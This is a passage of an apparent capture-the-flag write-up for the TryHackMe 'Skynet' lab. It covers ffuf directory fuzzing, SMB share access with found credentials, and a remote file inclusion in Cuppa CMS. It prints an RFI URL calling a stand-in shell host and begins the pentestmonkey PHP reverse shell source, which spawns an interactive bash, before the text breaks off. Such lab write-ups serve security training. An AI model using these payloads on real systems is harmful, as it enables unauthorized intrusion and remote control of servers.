+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ai &lt;span class="o">[&lt;/span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config &lt;span class="o">[&lt;/span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">css &lt;span class="o">[&lt;/span>Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">js &lt;span class="o">[&lt;/span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 62ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 333ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">squirrelmail &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 56ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">298&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:37&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The one thing that we want to check is squirrel mail, where we are going to put our username and password that we found before.&lt;/p>
+&lt;p>By entering the mail server we see 3 emails, the first is the one interessing for now.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">We have changed your smb password after system malfunction.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So that’s why I couldn’t access his share.&lt;/p>
+&lt;p>Another thing that we get from this is that we have found the two other accounts, probably skynet is the admin and serenakogan is another user.&lt;/p>
+&lt;p>So we go back to samba.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:47 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:51:03 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Improving Deep Neural Networks.pdf N &lt;span class="m">5743095&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Natural Language Processing-Building Sequence Models.pdf N &lt;span class="m">12927230&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Convolutional Neural Networks-CNN.pdf N &lt;span class="m">19655446&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> notes D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:18:40 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Neural Networks and Deep Learning.pdf N &lt;span class="m">4304586&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Structuring your Machine Learning Project.pdf N &lt;span class="m">3531427&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And now we are in.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:47 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:51:03 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Improving Deep Neural Networks.pdf N &lt;span class="m">5743095&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Natural Language Processing-Building Sequence Models.pdf N &lt;span class="m">12927230&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Convolutional Neural Networks-CNN.pdf N &lt;span class="m">19655446&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> notes D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:18:40 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Neural Networks and Deep Learning.pdf N &lt;span class="m">4304586&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Structuring your Machine Learning Project.pdf N &lt;span class="m">3531427&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 05:05:14 &lt;span class="m">2019&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9204224&lt;/span> blocks of size 1024. &lt;span class="m">5654060&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As we can see his share is full of useless things, the only thing that is important is the notes folder, from there we can see that it has a txt file named important.txt&lt;/p>
+&lt;p>Getting that file will reveal to us a hidden directory inside the web page.&lt;/p>
+&lt;p>This directory doesn’t tell us much.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>But one thing that we can do is to FUZZ this.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.34.11/&amp;lt;redacted&amp;gt;/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.34.11/&amp;lt;redacted&amp;gt;/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4154ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator &lt;span class="o">[&lt;/span>Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">338&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:39&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And we got another directory, an administrator page.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%202.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>After trying some password I decided to searcxh internet for exploits.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%203.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>I came accross this, a remote file ionclusion vuln.&lt;/p>
+&lt;p>I tested it out and it works.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled%204.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Unfortunately with this method we can’t also get the shadow.&lt;/p>
+&lt;p>So I tried another FLI listed in here:&lt;/p>
+&lt;p>&lt;code>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?&lt;/code>&lt;/p>
+&lt;p>For this to work, I first need to generate a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> &lt;span class="m">2007&lt;/span> pentestmonkey@pentestmonkey.net
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">set_time_limit &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$VERSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;1.0&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;your_ip&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$port&lt;/span> &lt;span class="o">=&lt;/span> 4444&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$chunk_size&lt;/span> &lt;span class="o">=&lt;/span> 1400&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$write_a&lt;/span> &lt;span class="o">=&lt;/span> null&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$error_a&lt;/span> &lt;span class="o">=&lt;/span> null&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;uname -a; w; id; /bin/bash -i&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> 0&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$debug&lt;/span> &lt;span class="o">=&lt;/span> 0&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>function_exists&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;pcntl_fork&amp;#39;&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$pid&lt;/span> &lt;span class="o">=&lt;/span> pcntl_fork&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$pid&lt;/span> &lt;span class="o">==&lt;/span> -1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t fork&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$pid&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span> // Parent exits
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>posix_setsid&lt;span class="o">()&lt;/span> &lt;span class="o">==&lt;/span> -1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Error: Can&amp;#39;t setsid()&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
